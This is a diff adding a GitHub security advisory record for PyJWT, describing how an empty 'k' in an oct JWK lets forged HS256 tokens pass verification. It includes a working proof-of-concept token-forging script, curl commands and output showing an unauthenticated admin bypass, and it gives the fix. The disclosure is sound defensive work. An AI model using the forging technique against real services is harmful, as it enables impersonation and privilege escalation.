@@ -1,0 +1,108 @@
+{
+  "id": "GHSA-pxh4-856f-4h89",
+  "modified": "2026-10-22T16:00:09.127222029Z",
+  "published": "2026-10-22T15:48:04Z",
+  "summary": "PyJWT: HS256/384/512 verify accepts empty HMAC key via oct JWK (PyJWK/PyJWKClient) enabling token forgery",
+  "details": "### Summary\n\n`HMACAlgorithm.from_jwk` accepts a symmetric (`kty=oct`) JWK whose `k` value is\nthe empty string and returns a zero-length key without raising. When a token is\nthen verified with that key object (a `PyJWK`, or a `PyJWK` resolved by\n`PyJWKSet` / `PyJWKClient`), the HMAC verifier computes\n`HMAC(key=b\"\", signing_input)` and accepts any token an attacker forged with the\nsame empty key. The attacker needs no secret knowledge: they reproduce the digest\nlocally with an empty key and set the token's `kid` to the empty-`k` JWK.\n\nThe empty-key rejection that `HMACAlgorithm.prepare_key` performs for\nstring/bytes secrets (added in 2.13.0) was never propagated to the sibling\n`from_jwk` code path, so the JWK/JWKS verification route stays exploitable. Under\ndefault decode options this path only emits an `InsecureKeyLengthWarning`, not an\nerror, so verification still succeeds. This is the same \"empty/nil HMAC key is\naccepted by verify\" defect the JWT ecosystem is currently closing library-side:\nfast-jwt CVE-2026-44351 (CVSS 9.1) and ruby-jwt CVE-2026-45363 both added a\nlibrary-side reject-empty-HMAC-key precondition.\n\n### Affected versions\n\n`PyJWT` (PyPI package `pyjwt`) `\u003c= 2.13.0`, current `master` at commit\n`7144e4534c34810f4525dc4578a32addd8212cff`. The string/bytes secret path is\nalready guarded in 2.13.0; the JWK/JWKS path is not.\n\n### Privilege required\n\nUnauthenticated. Any party who can reach a JWT-verifying endpoint of an\napplication that verifies via a `PyJWK` / `PyJWKSet` / `PyJWKClient` whose oct\nkey has an empty `k` can forge tokens with arbitrary claims.\n\nPreconditions: the verifier resolves the HMAC key from a JWK/JWKS whose oct\nentry carries an empty `k`. This occurs when the signing secret is sourced from\nan unset environment variable / unset config row / key-finder fallback that\nbase64url-encodes `b\"\"` into the published JWKS, or when the application trusts a\nJWKS containing such an entry. The equivalent unset-secret case for the\nstring-secret API (`jwt.decode(token, key=\"\")`) is already rejected in 2.13.0;\nthe JWK route is the remaining reachable surface for the same misconfiguration.\n\n### Vulnerable code\n\n`jwt/algorithms.py`, `HMACAlgorithm.from_jwk` (line 380):\n\n```python\n@staticmethod\ndef from_jwk(jwk: str | JWKDict) -\u003e bytes:\n    try:\n        if isinstance(jwk, str):\n            obj: JWKDict = json.loads(jwk)\n        elif isinstance(jwk, dict):\n            obj = jwk\n        else:\n            raise ValueError\n    except ValueError:\n        raise InvalidKeyError(\"Key is not valid JSON\") from None\n\n    if obj.get(\"kty\") != \"oct\":\n        raise InvalidKeyError(\"Not an HMAC key\")\n\n    return base64url_decode(obj[\"k\"])   # \u003c-- empty k -\u003e b\"\", no rejection\n```\n\nContrast the sibling `prepare_key`, which DID get the guard (lines 325-329):\n\n```python\ndef prepare_key(self, key: str | bytes) -\u003e bytes:\n    key_bytes = force_bytes(key)\n\n    if len(key_bytes) == 0:\n        raise InvalidKeyError(\"HMAC key must not be empty.\")\n```\n\nIn `jwt/api_jws.py`, `_verify_signature` (lines 389-416) uses the `PyJWK` key\nmaterial directly, bypassing `prepare_key`, and the length warning is non-fatal\nby default:\n\n```python\n        if isinstance(key, PyJWK):\n            if alg != key.algorithm_name:\n                raise InvalidAlgorithmError(\n                    f\"Token algorithm {alg!r} does not match the key's \"\n                    f\"algorithm {key.algorithm_name!r}\"\n                )\n            alg_obj = key.Algorithm\n            prepared_key = key.key            # from_jwk output (b\"\"), prepare_key not run\n        else:\n            try:\n                alg_obj = self.get_algorithm_by_name(alg)\n            except NotImplementedError as e:\n                raise InvalidAlgorithmError(\"Algorithm not supported\") from e\n            prepared_key = alg_obj.prepare_key(key)\n\n        key_length_msg = alg_obj.check_key_length(prepared_key)\n        if key_length_msg:\n            if effective_options.get(\"enforce_minimum_key_length\", False):\n                raise InvalidKeyError(key_length_msg)\n            else:\n                warnings.warn(key_length_msg, InsecureKeyLengthWarning, stacklevel=4)  # default: warn only\n\n        if not alg_obj.verify(signing_input, prepared_key, signature):  # verify with b\"\" succeeds\n            raise InvalidSignatureError(\"Signature verification failed\")\n```\n\n`PyJWK.__init__` sets `self.key = self.Algorithm.from_jwk(self._jwk_data)`, so a\n`{\"kty\":\"oct\",\"k\":\"\"}` JWK yields `PyJWK.key == b\"\"`. `PyJWKSet` and\n`PyJWKClient.get_signing_key_from_jwt` build `PyJWK` objects the same way, so the\nJWKS-over-HTTP resolution route is affected identically.\n\nThe 2.13.0 release note (`CHANGELOG.rst`) documents the `prepare_key` JWK/PEM\nhardening (GHSA-xgmm-8j9v-c9wx) and the `PyJWK` alg-binding fix\n(GHSA-jq35-7prp-9v3f), and the test suite has\n`test_hmac_prepare_key_rejects_empty_key` plus\n`test_hmac_from_jwk_should_raise_exception_if_empty_json` (which tests an empty\nJSON object `{}`, not an oct key with empty `k`). The empty-`k` oct case is the\nuntested sibling path this report closes.\n\n### How the attacker input reaches the sink\n\nAn unauthenticated HTTP client controls the bearer token entirely: its `kid`\nselects the empty-`k` oct JWK, and its signature is computed locally with the\nempty key. The token flows request header -\u003e `PyJWKClient.get_signing_key_from_jwt`\n(kid resolution against the trusted JWKS) -\u003e `jwt.decode` with the resolved\n`PyJWK` -\u003e `_verify_signature` -\u003e `HMACAlgorithm.verify(signing_input, b\"\", sig)`.\nNo secret,\ncredential, or prior session is required; the only server-side precondition is a\nJWKS oct entry with an empty `k`, which the \"unset signing secret\" configuration\nproduces. This is the identical trust boundary the string-secret path already\nguards.\n\n### Proof of concept\n\n### End-to-end reproduction against pinned PyPI `pyjwt` 2.13.0 (two deployed Flask services)\n\nTwo services model a standard OIDC-style deployment: an auth service publishing a\nJWKS, and a protected resource server validating bearer tokens against that JWKS\nwith PyJWT's documented `PyJWKClient` pattern. The auth service's signing secret\nis sourced from an unset env var (`SIGNING_SECRET` unset -\u003e `\"\"`), so the\npublished oct JWK carries `k == \"\"`.\n\n`idp.py` (auth service):\n\n```python\nimport os, base64\nfrom flask import Flask, jsonify\napp = Flask(__name__)\nSIGNING_SECRET = os.environ.get(\"SIGNING_SECRET\", \"\")   # UNSET at runtime -\u003e \"\"\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\n\n@app.route(\"/.well-known/jwks.json\")\ndef jwks():\n    return jsonify({\"keys\": [{\n        \"kty\": \"oct\", \"use\": \"sig\", \"alg\": \"HS256\",\n        \"kid\": \"auth-signing-2026\",\n        \"k\": b64u(SIGNING_SECRET.encode()),   # empty secret -\u003e k == \"\"\n    }]})\n\nif __name__ == \"__main__\":\n    app.run(port=9101)\n```\n\n`api.py` (protected resource server):\n\n```python\nfrom flask import Flask, request, jsonify\nimport jwt\nfrom jwt import PyJWKClient\napp = Flask(__name__)\njwks_client = PyJWKClient(\"http://127.0.0.1:9101/.well-known/jwks.json\")\n\ndef authenticate():\n    auth = request.headers.get(\"Authorization\", \"\")\n    if not auth.startswith(\"Bearer \"):\n        return None, \"missing bearer token\"\n    token = auth.split(\" \", 1)[1]\n    try:\n        signing_key = jwks_client.get_signing_key_from_jwt(token)  # resolves by kid\n        claims = jwt.decode(token, signing_key, algorithms=[\"HS256\", \"RS256\"])\n    except Exception as e:\n        return None, \"invalid token: %s\" % type(e).__name__\n    return claims, None\n\n@app.route(\"/api/admin/users\")\ndef admin_users():\n    claims, err = authenticate()\n    if err:\n        return jsonify({\"error\": err}), 401\n    if claims.get(\"role\") != \"admin\":\n        return jsonify({\"error\": \"forbidden\"}), 403\n    return jsonify({\"ok\": True, \"action\": \"list_all_users\",\n                    \"as_user\": claims.get(\"sub\"), \"role\": claims.get(\"role\")})\n\nif __name__ == \"__main__\":\n    app.run(port=9102)\n```\n\n`forge.py` (attacker; no secret knowledge):\n\n```python\nimport hmac, hashlib, base64, json, sys\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\nheader={\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"auth-signing-2026\"}\npayload={\"sub\":\"attacker@evil.example\",\"role\":\"admin\"}\nsi=b64u(json.dumps(header,separators=(',',':')).encode())+\".\"+b64u(json.dumps(payload,separators=(',',':')).encode())\nkey = sys.argv[1].encode() if len(sys.argv)\u003e1 else b\"\"   # empty key\nsig=hmac.new(key, si.encode(), hashlib.sha256).digest()\nprint(si+\".\"+b64u(sig))\n```\n\nRun:\n\n```bash\npython -m venv v \u0026\u0026 ./v/bin/pip install \"PyJWT==2.13.0\" flask\n( SIGNING_SECRET= ./v/bin/python idp.py \u0026 ) ; ./v/bin/python api.py \u0026\nFORGED=$(./v/bin/python forge.py \"\")\ncurl -s -H \"Authorization: Bearer $FORGED\" http://127.0.0.1:9102/api/admin/users\n```\n\nVerbatim run (attack, both negative controls, sanity, and patched-build re-run):\n\n```\n### PyJWT version\n2.13.0\n\n### JWKS published by the auth service (note the empty \"k\"):\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n\n### Baseline: unauthenticated request to admin endpoint\nHTTP 401\n\n### ATTACK: attacker forges HS256 admin token signed with the EMPTY key\nforged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImF1dGgtc2lnbmluZy0yMDI2In0.eyJzdWIiOiJhdHRhY2tlckBldmlsLmV4YW1wbGUiLCJyb2xlIjoiYWRtaW4ifQ.iwgDP9D-oD0zXWMEUhx710f_NjHWKkrLVgjPAOtEUSQ\nresponse:\n{\"action\":\"list_all_users\",\"as_user\":\"attacker@evil.example\",\"ok\":true,\"role\":\"admin\"}\n  \u003c-- HTTP 200\n\n### NEGATIVE CONTROL 1: forge with a WRONG non-empty key (IdP still empty) -\u003e reject\n{\"error\":\"invalid token: InvalidSignatureError\"}\n  \u003c-- HTTP 401\n\n### NEGATIVE CONTROL 2: IdP restarted with a REAL non-empty secret; empty-key forgery must now fail\nJWKS now has non-empty k:\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"YS1yZWFsLTMyLWJ5dGUtc3Ryb25nLXNlY3JldC12YWx1ZS0xMjM0\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n{\"error\":\"invalid token: InvalidSignatureError\"}\n  \u003c-- HTTP 401\n\n### Sanity: a legitimately-signed token with the real secret is accepted\n{\"action\":\"list_all_users\",\"as_user\":\"attacker@evil.example\",\"ok\":true,\"role\":\"admin\"}\n  \u003c-- HTTP 200\n\n### PATCHED BUILD (from_jwk rejects empty k): re-run the empty-key forgery -\u003e now rejected\nJWKS (empty k, vulnerable config):\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n{\"error\":\"invalid token: PyJWKSetError\"}\n  \u003c-- HTTP 401\n```\n\nThe attack returns HTTP 200 with `role:admin` from an unauthenticated forged\ntoken. Both negative controls (wrong non-empty key; real non-empty secret at the\nauth service) return 401, isolating the defect to empty-key acceptance. The\npatched build (the `from_jwk` fix below) rejects the forgery.\n\n### Impact\n\n- Unauthenticated authentication bypass / token forgery: an attacker mints tokens\n  with arbitrary claims (`role:admin`, arbitrary `sub`) that verify successfully,\n  yielding full impersonation and privilege escalation on any endpoint gated by\n  such tokens.\n- Reachable through the documented JWKS verification API\n  (`PyJWKClient` / `PyJWKSet` / `PyJWK`), not just direct `HMACAlgorithm` use.\n- Triggered by the common \"unset signing secret\" misconfiguration that the\n  string-secret path already rejects in 2.13.0, leaving the JWK path as an\n  asymmetric gap.\n\n### Suggested fix\n\nReject a zero-length key in `HMACAlgorithm.from_jwk`, mirroring the guard that\n`prepare_key` already applies:\n\n```python\nif obj.get(\"kty\") != \"oct\":\n    raise InvalidKeyError(\"Not an HMAC key\")\n\nkey_bytes = base64url_decode(obj[\"k\"])\nif len(key_bytes) == 0:\n    raise InvalidKeyError(\"HMAC key must not be empty.\")\nreturn key_bytes\n```\n\nThis reuses the exact error message and length check the string/bytes path uses,\nso both HMAC key-loading routes enforce the same invariant. A regression test for\nthe empty-`k` oct JWK belongs next to `test_hmac_from_jwk_should_raise_exception_if_empty_json`.\n\n### Fix PR\n\nhttps://github.com/jpadilla/pyjwt-ghsa-pxh4-856f-4h89/pull/1 (private advisory\ntemp fork, base `master`, branch `fix/hmac-from-jwk-reject-empty-key`,\nDCO-signed; adds `test_hmac_from_jwk_rejects_empty_k`; `test_algorithms.py`,\n`test_api_jwk.py`, `test_api_jws.py` pass).\n\n### Credit\n\nReported by tonghuaroot.\n\n\u003e Maintainer update (2026-09-10): We reproduced the reported behavior: an `oct` JWK with an empty `k` value was decoded to an empty HMAC key and accepted through the JWK/PyJWK verification path, while the raw string/bytes path correctly rejected an empty key. The fix adds the same empty-key validation at the JWK boundary and includes a regression test. It is committed as `af8181ca0bec5e6b372fbba9afbe23702b787ceb` and has passed the available project tox environments, including crypto and non-crypto tests on Python 3.9, 3.12, and 3.13, plus mypy, package metadata, and coverage checks. Fresh Astra/max review accepted the fix and confirmed that nonempty, binary, and asymmetric-key behavior remains unchanged. The fix has not yet shipped in a released PyJWT version, so this advisory is being moved to draft and remains unpublished pending release.\n\n## Maintainer update — 2026-09-11\n\nThe verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pyjwt",
+        "purl": "pkg:pypi/pyjwt"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.14.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.1",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9",
+        "0.2.0",
+        "0.2.1",
+        "0.2.3",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.4.3",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.4.2",
+        "1.5.0",
+        "1.5.1",
+        "1.5.2",
+        "1.5.3",
+        "1.6.0",
+        "1.6.1",
+        "1.6.3",
+        "1.6.4",
+        "1.7.0",
+        "1.7.1",
+        "2.0.0",
+        "2.0.0a1",
+        "2.0.0a2",
+        "2.0.1",
+        "2.1.0",
+        "2.10.0",
+        "2.10.1",
+        "2.11.0",
+        "2.12.0",
+        "2.12.1",
+        "2.13.0",
+        "2.2.0",
+        "2.3.0",
+        "2.4.0",
+        "2.5.0",
+        "2.6.0",
+        "2.7.0",
+        "2.8.0",
+        "2.9.0"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.13.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-pxh4-856f-4h89/GHSA-pxh4-856f-4h89.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-pxh4-856f-4h89"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jpadilla/pyjwt/commit/af8181ca0bec5e6b372fbba9afbe23702b787ceb"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/jpadilla/pyjwt"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jpadilla/pyjwt/releases/tag/2.14.0"
+    }
+  ]
+}
